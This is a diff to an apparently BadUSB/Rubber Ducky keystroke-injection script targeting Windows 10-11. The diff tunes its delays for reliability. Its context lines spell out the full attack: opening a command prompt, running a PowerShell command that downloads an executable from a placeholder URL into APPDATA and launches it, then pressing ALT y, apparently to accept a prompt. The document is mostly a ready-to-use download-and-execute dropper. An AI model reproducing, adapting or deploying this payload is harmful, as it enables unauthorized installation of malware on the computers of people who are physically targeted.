@@ -11,16 +11,17 @@ REM # Target   : WINDOWS 10-11                 |
 REM ############################################
 REM   @guns.lol/RXSEESH | @github.com/RXSEESH
 GUI r
-DELAY 750
+DELAY 550
 STRING cmd
-DELAY 150
+DELAY 350
 ENTER
-DELAY 500
+DELAY 800
 STRING powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; iwr -Uri 'YOUR_URL' -OutFile \"$env:APPDATA\file.exe\"; Start-Process \"$env:APPDATA\file.exe\""
-DELAY 200
+DELAY 800
 ENTER
-DELAY 5000
+DELAY 8000
 ALT y
 ENTER
 STRING exit
+DELAY 800
 ENTER
